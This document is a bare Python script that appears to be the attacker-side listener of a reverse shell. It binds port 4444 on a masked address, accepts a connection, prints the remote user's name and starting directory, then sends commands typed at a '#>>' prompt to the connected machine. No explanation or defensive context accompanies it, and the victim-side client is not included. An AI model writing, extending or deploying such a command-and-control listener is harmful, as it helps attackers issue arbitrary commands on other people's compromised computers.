import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '***.***.*.**'
port = 4444
s.bind((host, port))
s.listen(1)
print('wait for connection...')
conn, addr = s.accept()
print('connected with ', addr)

current_user = conn.recv(1024)
current_user = current_user.decode()
current_user = str(current_user)
print('User: ', current_user)

current_dir = conn.recv(1024)
current_dir = current_dir.decode()
current_dir = str(current_dir)
print('Start from: ', current_dir)

while True:
    command = input(str('#>> '))
    conn.send(command.encode())

    if command == 'exit':
        break
